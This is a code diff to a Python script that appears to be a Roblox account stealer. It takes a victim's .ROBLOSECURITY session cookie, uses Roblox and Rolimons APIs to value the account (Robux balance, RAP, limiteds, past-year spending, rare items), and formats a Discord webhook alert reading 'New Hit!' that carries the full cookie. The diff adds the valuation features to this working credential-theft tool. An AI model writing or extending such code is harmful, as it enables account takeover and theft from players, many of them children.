@@ -6,11 +6,11 @@ import urllib.error
 import json
 import re
 import time
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 
 def safe_get(url, headers=None):
     try:
-        req = urllib.request.Request(url, headers=headers or {})
+        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req, timeout=10) as res:
             if res.status == 200:
                 return json.loads(res.read().decode('utf-8'))
@@ -62,7 +62,7 @@ def main():
         pending_robux = 0
         rap = 0
         limiteds_count = 0
-        total_spent_gamepasses = 0
+        total_spent_past_year = 0
         is_developer = False
         game_visits = 0
         has_korblox = False
@@ -89,7 +89,46 @@ def main():
             if economy_data:
                 robux_balance = economy_data.get("robux", 0)
 
-            # Robust Korblox & Headless Check (Bundle ID + Asset ID fallback)
+            # Fetch RAP and Limiteds count from Rolimons API
+            rolimons_data = safe_get(f"https://www.rolimons.com/playerapi/player/{user_id}")
+            if rolimons_data:
+                rap = rolimons_data.get("rap", 0)
+                inventory = rolimons_data.get("inventory", {})
+                if isinstance(inventory, dict):
+                    limiteds_count = len(inventory)
+                elif isinstance(inventory, list):
+                    limiteds_count = len(inventory)
+
+            # Calculate Robux spent over the past 1 year using transaction records
+            one_year_ago = datetime.now(timezone.utc) - timedelta(days=365)
+            cursor = ""
+            for _ in range(3):
+                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100"
+                if cursor:
+                    tx_url += f"&cursor={cursor}"
+                tx_data = safe_get(tx_url, headers)
+                if not tx_data or "data" not in tx_data:
+                    break
+                
+                for tx in tx_data["data"]:
+                    created_str = tx.get("created", "")
+                    try:
+                        tx_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
+                        if tx_date >= one_year_ago:
+                            currency = tx.get("currency", {})
+                            amount = currency.get("amount", 0)
+                            if amount < 0:
+                                total_spent_past_year += abs(amount)
+                        else:
+                            break
+                    except Exception:
+                        continue
+                
+                cursor = tx_data.get("nextPageCursor")
+                if not cursor:
+                    break
+
+            # Robust Korblox & Headless Check
             has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers)
             if not has_korblox:
                 k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers)
@@ -102,11 +141,11 @@ def main():
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
 
-        # Full un-truncated cookie together in a single clean block
+        # Full cookie combined into one continuous block
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
-            "content": f"@everyone New Payload / Request Captured from **{username}**!",
+            "content": f"@everyone New Hit! **{username}**!",
             "username": f"{username} | RBXDEV Bot",
             "avatar_url": avatar_thumb,
             "embeds": [{
@@ -123,7 +162,7 @@ def main():
                     f"> • Games Developer: `{str(is_developer)}`\n"
                     f"> • Game Visits: `{game_visits}`\n\n"
                     f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
-                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Spent: `{total_spent_gamepasses}` 🪙\n"
+                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Past 1 Year: `{total_spent_past_year}` 🪙\n"
                     f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                     f"💳 **Payments & Groups**\n"
                     f"> • Owned Groups: `{owned_groups_count}`\n"
